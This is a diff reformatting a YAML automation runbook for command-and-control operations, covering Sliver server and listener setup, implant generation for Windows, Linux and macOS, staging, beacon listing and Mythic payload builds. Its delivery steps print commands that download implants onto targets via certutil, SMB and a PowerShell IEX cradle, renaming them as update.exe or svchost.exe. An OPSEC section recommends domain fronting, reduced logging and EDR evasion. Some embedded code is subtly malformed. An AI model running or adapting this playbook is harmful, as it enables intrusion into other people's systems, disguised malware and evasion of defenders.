@@ -1,341 +1,585 @@
-# v2 runbook — C2 framework operations
-name: "C2 Framework Operations"
-description: "Deploy and operate C2 frameworks: Sliver server setup, implant generation, beacon management, and Mythic integration"
-version: "2.0"
-
+name: C2 Framework Operations
+description: 'Deploy and operate C2 frameworks: Sliver server setup, implant generation,
+  beacon management, and Mythic integration'
+version: '2.0'
 vars:
-  c2_framework: "sliver"     # sliver | mythic | cobaltstrike
-  c2_profile: "default"
-  listener_ip: ""
+  c2_framework: sliver
+  c2_profile: default
+  listener_ip: ''
   listener_port: 443
-  callback_host: ""
+  callback_host: ''
   callback_port: 443
-  implant_arch: "amd64"
-  implant_os: "windows"
+  implant_arch: amd64
+  implant_os: windows
   jitter: 30
   max_retry: 5
-
 steps:
-  - id: preamble
-    type: log
-    message: "C2 operations — {c2_framework} listener:{listener_ip} (case: {case_id})"
+- id: preamble
+  type: log
+  message: 'C2 operations — {c2_framework} listener:{listener_ip} (case: {case_id})'
+  name: Preamble
+- id: sliver_server
+  name: Sliver C2 server operations
+  type: sequential
+  steps:
+  - id: sliver_status
+    name: Check Sliver server status
+    tool: sliver
+    args:
+    - operator
+    - info
+    - -o
+    - '{case_dir}/sliver_status.txt'
+    timeout: 15
+    artifacts:
+    - '{case_dir}/sliver_status.txt'
+    when: c2_framework == sliver
+    type: tool
+  - id: sliver_start
+    name: Start Sliver server daemon
+    tool: bash
+    args:
+    - -c
+    - sliver-server daemon --lhost {listener_ip} --lport {listener_port} --daemon
+      > {case_dir}/sliver_server.log 2>&1 & echo $! > {case_dir}/sliver_server.pid
+    - -o
+    - '{case_dir}/sliver_server_start.txt'
+    timeout: 15
+    artifacts:
+    - '{case_dir}/sliver_server.pid'
+    when: c2_framework == sliver
+    type: tool
+  - id: sliver_operator
+    name: Create Sliver operator config
+    tool: sliver
+    args:
+    - operator
+    - configs
+    - --name
+    - operator1
+    - --lhost
+    - '{listener_ip}'
+    - --save
+    - '{case_dir}/operator1.cfg'
+    - -o
+    - '{case_dir}/sliver_operator_created.txt'
+    timeout: 15
+    type: tool
+  - id: sliver_http_listener
+    name: Start HTTP(S) listener
+    tool: sliver
+    args:
+    - --server
+    - '{listener_ip}:{listener_port}'
+    - http
+    - --lhost
+    - '{listener_ip}'
+    - --lport
+    - '80'
+    - --domain
+    - example.com
+    - -o
+    - '{case_dir}/sliver_http_listener.txt'
+    timeout: 15
+    type: tool
+  - id: sliver_https_listener
+    name: Start HTTPS listener
+    tool: sliver
+    args:
+    - --server
+    - '{listener_ip}:{listener_port}'
+    - https
+    - --lhost
+    - '{listener_ip}'
+    - --lport
+    - '443'
+    - --domain
+    - example.com
+    - --lets-encrypt
+    - -o
+    - '{case_dir}/sliver_https_listener.txt'
+    timeout: 30
+    when: listener_port == 443
+    type: tool
+  - id: sliver_mtls_listener
+    name: Start mTLS listener
+    tool: sliver
+    args:
+    - --server
+    - '{listener_ip}:{listener_port}'
+    - mtls
+    - --lhost
+    - '{listener_ip}'
+    - --lport
+    - '8888'
+    - -o
+    - '{case_dir}/sliver_mtls_listener.txt'
+    timeout: 15
+    type: tool
+- id: sliver_implants
+  name: Sliver implant generation
+  type: parallel
+  max_workers: 5
+  steps:
+  - id: implant_win_exe
+    name: Windows EXE implant
+    tool: sliver
+    args:
+    - --server
+    - '{listener_ip}:{listener_port}'
+    - generate
+    - --os
+    - windows
+    - --arch
+    - '{implant_arch}'
+    - --mtls
+    - '{listener_ip}:8888'
+    - --http
+    - '{listener_ip}:80'
+    - --https
+    - '{listener_ip}:443'
+    - --name
+    - windows-implant-{case_id}
+    - --save
+    - '{case_dir}/implant_windows_{implant_arch}.exe'
+    - --canary
+    - --max-errors
+    - '{max_retry}'
+    - -o
+    - '{case_dir}/implant_win_exe.txt'
+    timeout: 30
+    artifacts:
+    - '{case_dir}/implant_windows_{implant_arch}.exe'
+    type: tool
+  - id: implant_win_dll
+    name: Windows DLL implant
+    tool: sliver
+    args:
+    - --server
+    - '{listener_ip}:{listener_port}'
+    - generate
+    - --os
+    - windows
+    - --arch
+    - '{implant_arch}'
+    - --format
+    - shared
+    - --mtls
+    - '{listener_ip}:8888'
+    - --http
+    - '{listener_ip}:80'
+    - --https
+    - '{listener_ip}:443'
+    - --name
+    - windows-dll-{case_id}
+    - --save
+    - '{case_dir}/implant_windows_{implant_arch}.dll'
+    - --canary
+    - -o
+    - '{case_dir}/implant_win_dll.txt'
+    timeout: 30
+    artifacts:
+    - '{case_dir}/implant_windows_{implant_arch}.dll'
+    type: tool
+  - id: implant_win_shellcode
+    name: Windows shellcode
+    tool: sliver
+    args:
+    - --server
+    - '{listener_ip}:{listener_port}'
+    - generate
+    - --os
+    - windows
+    - --arch
+    - '{implant_arch}'
+    - --format
+    - shellcode
+    - --mtls
+    - '{listener_ip}:8888'
+    - --name
+    - shellcode-{case_id}
+    - --save
+    - '{case_dir}/implant_shellcode_{implant_arch}.bin'
+    - -o
+    - '{case_dir}/implant_shellcode_gen.txt'
+    timeout: 30
+    artifacts:
+    - '{case_dir}/implant_shellcode_{implant_arch}.bin'
+    type: tool
+  - id: implant_linux
+    name: Linux implant
+    tool: sliver
+    args:
+    - --server
+    - '{listener_ip}:{listener_port}'
+    - generate
+    - --os
+    - linux
+    - --arch
+    - '{implant_arch}'
+    - --mtls
+    - '{listener_ip}:8888'
+    - --http
+    - '{listener_ip}:80'
+    - --name
+    - linux-implant-{case_id}
+    - --save
+    - '{case_dir}/implant_linux_{implant_arch}'
+    - --canary
+    - -o
+    - '{case_dir}/implant_linux_gen.txt'
+    timeout: 30
+    artifacts:
+    - '{case_dir}/implant_linux_{implant_arch}'
+    type: tool
+  - id: implant_macos
+    name: MacOS implant
+    tool: sliver
+    args:
+    - --server
+    - '{listener_ip}:{listener_port}'
+    - generate
+    - --os
+    - macos
+    - --arch
+    - '{implant_arch}'
+    - --mtls
+    - '{listener_ip}:8888'
+    - --name
+    - macos-implant-{case_id}
+    - --save
+    - '{case_dir}/implant_macos_{implant_arch}'
+    - --canary
+    - -o
+    - '{case_dir}/implant_macos_gen.txt'
+    timeout: 30
+    when: implant_os == macos
+    type: tool
+  - id: implant_service
+    name: Generate service wrapper
+    tool: sliver
+    args:
+    - --server
+    - '{listener_ip}:{listener_port}'
+    - generate
+    - --os
+    - windows
+    - --arch
+    - '{implant_arch}'
+    - --format
+    - service
+    - --mtls
+    - '{listener_ip}:8888'
+    - --name
+    - svc-implant-{case_id}
+    - --save
+    - '{case_dir}/implant_svc_{implant_arch}.exe'
+    - -o
+    - '{case_dir}/implant_service_gen.txt'
+    timeout: 30
+    type: tool
+- id: sliver_staging
+  name: Sliver staging & profiles
+  type: parallel
+  steps:
+  - id: stage_profile
+    name: Create stage profile
+    tool: sliver
+    args:
+    - --server
+    - '{listener_ip}:{listener_port}'
+    - profiles
+    - new
+    - --profile-name
+    - '{c2_profile}'
+    - --mtls
+    - '{listener_ip}:8888'
+    - --http
+    - '{listener_ip}:80'
+    - --https
+    - '{listener_ip}:443'
+    - --canary
+    - --max-errors
+    - '{max_retry}'
+    - -o
+    - '{case_dir}/sliver_profile.txt'
+    timeout: 15
+    artifacts:
+    - '{case_dir}/sliver_profile.txt'
+    type: tool
+  - id: stage_listener
+    name: Start stage listener
+    tool: sliver
+    args:
+    - --server
+    - '{listener_ip}:{listener_port}'
+    - stage-listener
+    - --url
+    - http://{listener_ip}:8080/stage.woff
+    - --profile
+    - '{c2_profile}'
+    - -o
+    - '{case_dir}/sliver_stage_listener.txt'
+    timeout: 15
+    type: tool
+- id: sliver_beacons
+  name: Sliver beacon interaction
+  type: sequential
+  steps:
+  - id: sliver_beacon_list
+    name: List active beacons
+    tool: sliver
+    args:
+    - --server
+    - '{listener_ip}:{listener_port}'
+    - beacons
+    - -o
+    - '{case_dir}/sliver_beacons.txt'
+    timeout: 15
+    type: tool
+  - id: sliver_sessions
+    name: List interactive sessions
+    tool: sliver
+    args:
+    - --server
+    - '{listener_ip}:{listener_port}'
+    - sessions
+    - -o
+    - '{case_dir}/sliver_sessions.txt'
+    timeout: 15
+    type: tool
+  - id: sliver_armory
+    name: Armory extensions
+    tool: sliver
+    args:
+    - --server
+    - '{listener_ip}:{listener_port}'
+    - armory
+    - install
+    - -o
+    - '{case_dir}/sliver_armory.txt'
+    timeout: 30
+    type: tool
+- id: mythic
+  name: Mythic C2 operations
+  type: sequential
+  steps:
+  - id: mythic_status
+    name: Check Mythic status
+    tool: bash
+    args:
+    - -c
+    - curl -s http://{listener_ip}:7443/api/v1.4/status 2>/dev/null || echo 'Mythic
+      not running on port 7443'
+    - -o
+    - '{case_dir}/mythic_status.txt'
+    timeout: 15
+    type: tool
+  - id: mythic_apollo
+    name: Apollo (Windows) payload config
+    tool: python3
+    args:
+    - -c
+    - '"print(''=== Mythic Apollo Payload Config ==='');
 
-  # Phase 1: Sliver — Server setup
-  - id: sliver_server
-    name: "Sliver C2 server operations"
-    type: sequential
-    steps:
-      - id: sliver_status
-        name: "Check Sliver server status"
-        tool: sliver
-        args: ["operator", "info",
-               "-o", "{case_dir}/sliver_status.txt"]
-        timeout: 15
-        artifacts: ["{case_dir}/sliver_status.txt"]
-        when: "c2_framework == sliver"
+      print();
 
-      - id: sliver_start
-        name: "Start Sliver server daemon"
-        tool: bash
-        args: ["-c",
-               "sliver-server daemon --lhost {listener_ip} --lport {listener_port} --daemon > {case_dir}/sliver_server.log 2>&1 & echo $! > {case_dir}/sliver_server.pid",
-               "-o", "{case_dir}/sliver_server_start.txt"]
-        timeout: 15
-        artifacts: ["{case_dir}/sliver_server.pid"]
-        when: "c2_framework == sliver"
+      print(''# Apollo Windows agent'');
 
-      - id: sliver_operator
-        name: "Create Sliver operator config"
-        tool: sliver
-        args: ["operator", "configs",
-               "--name", "operator1",
-               "--lhost", "{listener_ip}",
-               "--save", "{case_dir}/operator1.cfg",
-               "-o", "{case_dir}/sliver_operator_created.txt"]
-        timeout: 15
+      print(''Callback host: {listener_ip}'');
 
-      - id: sliver_http_listener
-        name: "Start HTTP(S) listener"
-        tool: sliver
-        args: ["--server", "{listener_ip}:{listener_port}",
-               "http",
-               "--lhost", "{listener_ip}",
-               "--lport", "80",
-               "--domain", "example.com",
-               "-o", "{case_dir}/sliver_http_listener.txt"]
-        timeout: 15
+      print(f''Callback port: {callback_port}'');
 
-      - id: sliver_https_listener
-        name: "Start HTTPS listener"
-        tool: sliver
-        args: ["--server", "{listener_ip}:{listener_port}",
-               "https",
-               "--lhost", "{listener_ip}",
-               "--lport", "443",
-               "--domain", "example.com",
-               "--lets-encrypt",
-               "-o", "{case_dir}/sliver_https_listener.txt"]
-        timeout: 30
-        when: "listener_port == 443"
+      print(f''Jitter: {jitter}%'');
 
-      - id: sliver_mtls_listener
-        name: "Start mTLS listener"
-        tool: sliver
-        args: ["--server", "{listener_ip}:{listener_port}",
-               "mtls",
-               "--lhost", "{listener_ip}",
-               "--lport", "8888",
-               "-o", "{case_dir}/sliver_mtls_listener.txt"]
-        timeout: 15
+      print(f''Max retries: {max_retry}'');
 
-  # Phase 2: Sliver — Implant generation
-  - id: sliver_implants
-    name: "Sliver implant generation"
-    type: parallel
-    max_workers: 5
-    steps:
-      - id: implant_win_exe
-        name: "Windows EXE implant"
-        tool: sliver
-        args: ["--server", "{listener_ip}:{listener_port}",
-               "generate",
-               "--os", "windows",
-               "--arch", "{implant_arch}",
-               "--mtls", "{listener_ip}:8888",
-               "--http", "{listener_ip}:80",
-               "--https", "{listener_ip}:443",
-               "--name", "windows-implant-{case_id}",
-               "--save", "{case_dir}/implant_windows_{implant_arch}.exe",
-               "--canary",
-               "--max-errors", "{max_retry}",
-               "-o", "{case_dir}/implant_win_exe.txt"]
-        timeout: 30
-        artifacts: ["{case_dir}/implant_windows_{implant_arch}.exe"]
+      print();
 
-      - id: implant_win_dll
-        name: "Windows DLL implant"
-        tool: sliver
-        args: ["--server", "{listener_ip}:{listener_port}",
-               "generate",
-               "--os", "windows",
-               "--arch", "{implant_arch}",
-               "--format", "shared",
-               "--mtls", "{listener_ip}:8888",
-               "--http", "{listener_ip}:80",
-               "--https", "{listener_ip}:443",
-               "--name", "windows-dll-{case_id}",
-               "--save", "{case_dir}/implant_windows_{implant_arch}.dll",
-               "--canary",
-               "-o", "{case_dir}/implant_win_dll.txt"]
-        timeout: 30
-        artifacts: ["{case_dir}/implant_windows_{implant_arch}.dll"]
+      print(''# Deploy via Mythic REST API:'');
 
-      - id: implant_win_shellcode
-        name: "Windows shellcode"
-        tool: sliver
-        args: ["--server", "{listener_ip}:{listener_port}",
-               "generate",
-               "--os", "windows",
-               "--arch", "{implant_arch}",
-               "--format", "shellcode",
-               "--mtls", "{listener_ip}:8888",
-               "--name", "shellcode-{case_id}",
-               "--save", "{case_dir}/implant_shellcode_{implant_arch}.bin",
-               "-o", "{case_dir}/implant_shellcode_gen.txt"]
-        timeout: 30
-        artifacts: ["{case_dir}/implant_shellcode_{implant_arch}.bin"]
+      print(f''curl -X POST https://{listener_ip}:7443/api/v1.4/payload/type/apollo/build
+      -H \"Authorization: Bearer TOKEN\" -d \''{}\\\"''cat'' do\\''\\\"''\");
 
-      - id: implant_linux
-        name: "Linux implant"
-        tool: sliver
-        args: ["--server", "{listener_ip}:{listener_port}",
-               "generate",
-               "--os", "linux",
-               "--arch", "{implant_arch}",
-               "--mtls", "{listener_ip}:8888",
-               "--http", "{listener_ip}:80",
-               "--name", "linux-implant-{case_id}",
-               "--save", "{case_dir}/implant_linux_{implant_arch}",
-               "--canary",
-               "-o", "{case_dir}/implant_linux_gen.txt"]
-        timeout: 30
-        artifacts: ["{case_dir}/implant_linux_{implant_arch}"]
+      print();
 
-      - id: implant_macos
-        name: "MacOS implant"
-        tool: sliver
-        args: ["--server", "{listener_ip}:{listener_port}",
-               "generate",
-               "--os", "macos",
-               "--arch", "{implant_arch}",
-               "--mtls", "{listener_ip}:8888",
-               "--name", "macos-implant-{case_id}",
-               "--save", "{case_dir}/implant_macos_{implant_arch}",
-               "--canary",
-               "-o", "{case_dir}/implant_macos_gen.txt"]
-        timeout: 30
-        when: "implant_os == macos"
+      print(''# Or use Mythic CLI:'');
 
-      - id: implant_service
-        name: "Generate service wrapper"
-        tool: sliver
-        args: ["--server", "{listener_ip}:{listener_port}",
-               "generate",
-               "--os", "windows",
-               "--arch", "{implant_arch}",
-               "--format", "service",
-               "--mtls", "{listener_ip}:8888",
-               "--name", "svc-implant-{case_id}",
-               "--save", "{case_dir}/implant_svc_{implant_arch}.exe",
-               "-o", "{case_dir}/implant_service_gen.txt"]
-        timeout: 30
+      print(''mythic-cli payload generate apollo --callback-host {listener_ip} --callback-port
+      {callback_port}'');
 
-  # Phase 3: Sliver — Stage listeners & profiles
-  - id: sliver_staging
-    name: "Sliver staging & profiles"
-    type: parallel
-    steps:
-      - id: stage_profile
-        name: "Create stage profile"
-        tool: sliver
-        args: ["--server", "{listener_ip}:{listener_port}",
-               "profiles",
-               "new",
-               "--profile-name", "{c2_profile}",
-               "--mtls", "{listener_ip}:8888",
-               "--http", "{listener_ip}:80",
-               "--https", "{listener_ip}:443",
-               "--canary",
-               "--max-errors", "{max_retry}",
-               "-o", "{case_dir}/sliver_profile.txt"]
-        timeout: 15
-        artifacts: ["{case_dir}/sliver_profile.txt"]
+      "'
+    - -o
+    - '{case_dir}/mythic_apollo_config.txt'
+    timeout: 15
+    type: tool
+- id: delivery
+  name: Payload delivery mechanisms
+  type: parallel
+  max_workers: 4
+  steps:
+  - id: dl_host
+    name: Host payloads via HTTP
+    tool: python3
+    args:
+    - -c
+    - "\"from http.server import HTTPServer, SimpleHTTPRequestHandler;\nimport threading;\n\
+      class C2Handler(SimpleHTTPRequestHandler):\n def log_message(self, fmt, *args):\
+      \ pass\nhandler=lambda *a,**kw: C2Handler(*{case_dir}/implant_windows_{implant_arch}.exe,**kw);\n\
+      # In real run: HTTPServer((\\\"0.0.0.0\\\",8080),C2Handler).serve_forever()\n\
+      print('Payload HTTP server command:');\nprint(f'python3 -m http.server 8080\
+      \ --directory {case_dir}')\nprint(f'Target download: certutil -urlcache -f http://{listener_ip}:8080/implant_windows_amd64.exe\
+      \ C:\\\\Windows\\\\Temp\\\\update.exe')\n\""
+    - -o
+    - '{case_dir}/payload_hosting.txt'
+    timeout: 15
+    artifacts:
+    - '{case_dir}/payload_hosting.txt'
+    type: tool
+  - id: dl_smb_delivery
+    name: SMB payload delivery
+    tool: python3
+    args:
+    - -c
+    - '"print(''=== SMB Payload Delivery ==='');
 
-      - id: stage_listener
-        name: "Start stage listener"
-        tool: sliver
-        args: ["--server", "{listener_ip}:{listener_port}",
-               "stage-listener",
-               "--url", "http://{listener_ip}:8080/stage.woff",
-               "--profile", "{c2_profile}",
-               "-o", "{case_dir}/sliver_stage_listener.txt"]
-        timeout: 15
+      print(f''impacket-smbserver -smb2support share {case_dir}'');
 
-  # Phase 4: Sliver — Beacon commands
-  - id: sliver_beacons
-    name: "Sliver beacon interaction"
-    type: sequential
-    steps:
-      - id: sliver_beacon_list
-        name: "List active beacons"
-        tool: sliver
-        args: ["--server", "{listener_ip}:{listener_port}",
-               "beacons",
-               "-o", "{case_dir}/sliver_beacons.txt"]
-        timeout: 15
+      print(f''copy \\\\{listener_ip}\\share\\implant_windows_amd64.exe C:\\Windows\\Temp\\svchost.exe'');
 
-      - id: sliver_sessions
-        name: "List interactive sessions"
-        tool: sliver
-        args: ["--server", "{listener_ip}:{listener_port}",
-               "sessions",
-               "-o", "{case_dir}/sliver_sessions.txt"]
-        timeout: 15
+      print();
 
-      - id: sliver_armory
-        name: "Armory extensions"
-        tool: sliver
-        args: ["--server", "{listener_ip}:{listener_port}",
-               "armory",
-               "install",
-               "-o", "{case_dir}/sliver_armory.txt"]
-        timeout: 30
+      print(''=== WPAD/PAC Delivery ==='');
 
-  # Phase 5: Mythic — Operations
-  - id: mythic
-    name: "Mythic C2 operations"
-    type: sequential
-    steps:
-      - id: mythic_status
-        name: "Check Mythic status"
-        tool: bash
-        args: ["-c",
-               "curl -s http://{listener_ip}:7443/api/v1.4/status 2>/dev/null || echo 'Mythic not running on port 7443'",
-               "-o", "{case_dir}/mythic_status.txt"]
-        timeout: 15
+      print(''Responder with -r flag for wpad redirect'');
 
-      - id: mythic_apollo
-        name: "Apollo (Windows) payload config"
-        tool: python3
-        args: ["-c",
-               "\"print('=== Mythic Apollo Payload Config ===');\nprint();\nprint('# Apollo Windows agent');\nprint('Callback host: {listener_ip}');\nprint(f'Callback port: {callback_port}');\nprint(f'Jitter: {jitter}%');\nprint(f'Max retries: {max_retry}');\nprint();\nprint('# Deploy via Mythic REST API:');\nprint(f'curl -X POST https://{listener_ip}:7443/api/v1.4/payload/type/apollo/build -H \\\"Authorization: Bearer TOKEN\\\" -d \\'{}\\\\\\\"'cat' do\\\\'\\\\\\\"'\\\");\nprint();\nprint('# Or use Mythic CLI:');\nprint('mythic-cli payload generate apollo --callback-host {listener_ip} --callback-port {callback_port}');\n\"",
-               "-o", "{case_dir}/mythic_apollo_config.txt"]
-        timeout: 15
+      print();
 
-  # Phase 6: Payload delivery
-  - id: delivery
-    name: "Payload delivery mechanisms"
-    type: parallel
-    max_workers: 4
-    steps:
-      - id: dl_host
-        name: "Host payloads via HTTP"
-        tool: python3
-        args: ["-c",
-               "\"from http.server import HTTPServer, SimpleHTTPRequestHandler;\nimport threading;\nclass C2Handler(SimpleHTTPRequestHandler):\n def log_message(self, fmt, *args): pass\nhandler=lambda *a,**kw: C2Handler(*{case_dir}/implant_windows_{implant_arch}.exe,**kw);\n# In real run: HTTPServer((\\\"0.0.0.0\\\",8080),C2Handler).serve_forever()\nprint('Payload HTTP server command:');\nprint(f'python3 -m http.server 8080 --directory {case_dir}')\nprint(f'Target download: certutil -urlcache -f http://{listener_ip}:8080/implant_windows_amd64.exe C:\\\\Windows\\\\Temp\\\\update.exe')\n\"",
-               "-o", "{case_dir}/payload_hosting.txt"]
-        timeout: 15
-        artifacts: ["{case_dir}/payload_hosting.txt"]
+      print(''=== PowerShell Remote Download ==='');
 
-      - id: dl_smb_delivery
-        name: "SMB payload delivery"
-        tool: python3
-        args: ["-c",
-               "\"print('=== SMB Payload Delivery ===');\nprint(f'impacket-smbserver -smb2support share {case_dir}');\nprint(f'copy \\\\\\\\{listener_ip}\\\\share\\\\implant_windows_amd64.exe C:\\\\Windows\\\\Temp\\\\svchost.exe');\nprint();\nprint('=== WPAD/PAC Delivery ===');\nprint('Responder with -r flag for wpad redirect');\nprint();\nprint('=== PowerShell Remote Download ===');\nprint(f'IEX (New-Object Net.WebClient).DownloadString(\\\"http://{listener_ip}:8080/implant_windows_amd64.exe\\\")');\n\"",
-               "-o", "{case_dir}/payload_delivery.txt"]
-        timeout: 15
+      print(f''IEX (New-Object Net.WebClient).DownloadString(\"http://{listener_ip}:8080/implant_windows_amd64.exe\")'');
 
-  # Phase 7: C2 operational security
-  - id: opsec
-    name: "C2 OPSEC considerations"
-    type: sequential
-    steps:
-      - id: opsec_guide
-        name: "OPSEC notes"
-        tool: python3
-        args: ["-c",
-               "\"print('=== C2 OPSEC Checklist ===');\nprint();\nprint('1. Redirectors: Use CDN or VPS redirectors (Nginx reverse proxy)');\nprint(f'   nginx -> proxy_pass https://{listener_ip}:443');\nprint();\nprint('2. Domain fronting: Use CDN (Cloudflare, Fastly, Azure)');\nprint('3. Certificate hygiene: Use Let\\'s Encrypt or legit certs');\nprint('4. Sleep & jitter: Set jitter {jitter}% to avoid beacon detection');\nprint('5. Kill dates: Set implant kill date to limit exposure');\nprint('6. Canary domains: Track exposure via DNS canaries');\nprint('7. Logging: Minimize C2 server logging in production');\nprint('8. Never mix personal and C2 infrastructure');\nprint();\nprint('=== Detection Evasion ===');\nprint('- Use staggered DNS for beaconing (not HTTP every 60s)');\nprint('- Avoid default Sliver/Mythic profiles');\nprint('- Custom build implants with modified hashes');\nprint('- Use EDR evasion: indirect syscalls, API unhooking');\nprint();\nprint('=== Cleanup ===');\nprint('- Sliver: sliver-server uninstall');\nprint('- Mythic: docker-compose down -v');\nprint('- Remove redirector configs');\nprint('- Revoke any leaked certs');\n\"",
-               "-o", "{case_dir}/c2_opsec_guide.txt"]
-        timeout: 15
-        artifacts: ["{case_dir}/c2_opsec_guide.txt"]
+      "'
+    - -o
+    - '{case_dir}/payload_delivery.txt'
+    timeout: 15
+    type: tool
+- id: opsec
+  name: C2 OPSEC considerations
+  type: sequential
+  steps:
+  - id: opsec_guide
+    name: OPSEC notes
+    tool: python3
+    args:
+    - -c
+    - '"print(''=== C2 OPSEC Checklist ==='');
 
-  # Phase 8: Report
-  - id: report
-    name: "Generate C2 operations report"
-    type: report
-    format: markdown
-    title: "C2 Framework Operations — {c2_framework}"
-    output: "{case_dir}/c2-operations-report.md"
-    sections:
-      - heading: "Setup"
-        body: "- Framework: {c2_framework}\n- Listener: {listener_ip}:{listener_port}\n- Callback: {callback_host}:{callback_port}\n- Case: {case_id}"
-      - heading: "Sliver"
-        body: "- Server: {case_dir}/sliver_server_start.txt\n- HTTP listener: {case_dir}/sliver_http_listener.txt\n- mTLS listener: {case_dir}/sliver_mtls_listener.txt"
-      - heading: "Implants"
-        body: "- Windows EXE: {case_dir}/implant_windows_{implant_arch}.exe\n- Windows DLL: {case_dir}/implant_windows_{implant_arch}.dll\n- Shellcode: {case_dir}/implant_shellcode_{implant_arch}.bin\n- Linux: {case_dir}/implant_linux_{implant_arch}\n- Service: {case_dir}/implant_svc_{implant_arch}.exe"
-      - heading: "Staging"
-        body: "- Profile: {case_dir}/sliver_profile.txt\n- Stage listener: {case_dir}/sliver_stage_listener.txt"
-      - heading: "Beacons"
-        body: "- Active: {case_dir}/sliver_beacons.txt\n- Sessions: {case_dir}/sliver_sessions.txt"
-      - heading: "Mythic"
-        body: "- Status: {case_dir}/mythic_status.txt\n- Apollo config: {case_dir}/mythic_apollo_config.txt"
-      - heading: "Delivery"
-        body: "- HTTP hosting: {case_dir}/payload_hosting.txt\n- SMB delivery: {case_dir}/payload_delivery.txt"
-      - heading: "OPSEC"
-        body: "- C2 security: {case_dir}/c2_opsec_guide.txt"
+      print();
 
+      print(''1. Redirectors: Use CDN or VPS redirectors (Nginx reverse proxy)'');
+
+      print(f''   nginx -> proxy_pass https://{listener_ip}:443'');
+
+      print();
+
+      print(''2. Domain fronting: Use CDN (Cloudflare, Fastly, Azure)'');
+
+      print(''3. Certificate hygiene: Use Let\''s Encrypt or legit certs'');
+
+      print(''4. Sleep & jitter: Set jitter {jitter}% to avoid beacon detection'');
+
+      print(''5. Kill dates: Set implant kill date to limit exposure'');
+
+      print(''6. Canary domains: Track exposure via DNS canaries'');
+
+      print(''7. Logging: Minimize C2 server logging in production'');
+
+      print(''8. Never mix personal and C2 infrastructure'');
+
+      print();
+
+      print(''=== Detection Evasion ==='');
+
+      print(''- Use staggered DNS for beaconing (not HTTP every 60s)'');
+
+      print(''- Avoid default Sliver/Mythic profiles'');
+
+      print(''- Custom build implants with modified hashes'');
+
+      print(''- Use EDR evasion: indirect syscalls, API unhooking'');
+
+      print();
+
+      print(''=== Cleanup ==='');
+
+      print(''- Sliver: sliver-server uninstall'');
+
+      print(''- Mythic: docker-compose down -v'');
+
+      print(''- Remove redirector configs'');
+
+      print(''- Revoke any leaked certs'');
+
+      "'
+    - -o
+    - '{case_dir}/c2_opsec_guide.txt'
+    timeout: 15
+    artifacts:
+    - '{case_dir}/c2_opsec_guide.txt'
+    type: tool
+- id: report
+  name: Generate C2 operations report
+  type: report
+  format: markdown
+  title: C2 Framework Operations — {c2_framework}
+  output: '{case_dir}/c2-operations-report.md'
+  sections:
+  - heading: Setup
+    body: '- Framework: {c2_framework}
+
+      - Listener: {listener_ip}:{listener_port}
+
+      - Callback: {callback_host}:{callback_port}
+
+      - Case: {case_id}'
+  - heading: Sliver
+    body: '- Server: {case_dir}/sliver_server_start.txt
+
+      - HTTP listener: {case_dir}/sliver_http_listener.txt
+
+      - mTLS listener: {case_dir}/sliver_mtls_listener.txt'
+  - heading: Implants
+    body: '- Windows EXE: {case_dir}/implant_windows_{implant_arch}.exe
+
+      - Windows DLL: {case_dir}/implant_windows_{implant_arch}.dll
+
+      - Shellcode: {case_dir}/implant_shellcode_{implant_arch}.bin
+
+      - Linux: {case_dir}/implant_linux_{implant_arch}
+
+      - Service: {case_dir}/implant_svc_{implant_arch}.exe'
+  - heading: Staging
+    body: '- Profile: {case_dir}/sliver_profile.txt
+
+      - Stage listener: {case_dir}/sliver_stage_listener.txt'
+  - heading: Beacons
+    body: '- Active: {case_dir}/sliver_beacons.txt
+
+      - Sessions: {case_dir}/sliver_sessions.txt'
+  - heading: Mythic
+    body: '- Status: {case_dir}/mythic_status.txt
+
+      - Apollo config: {case_dir}/mythic_apollo_config.txt'
+  - heading: Delivery
+    body: '- HTTP hosting: {case_dir}/payload_hosting.txt
+
+      - SMB delivery: {case_dir}/payload_delivery.txt'
+  - heading: OPSEC
+    body: '- C2 security: {case_dir}/c2_opsec_guide.txt'
 postflight:
-  - id: done
-    type: notify
-    level: info
-    message: "C2 operations complete — {case_dir}"
+- id: done
+  type: notify
+  level: info
+  message: C2 operations complete — {case_dir}
+  name: Done
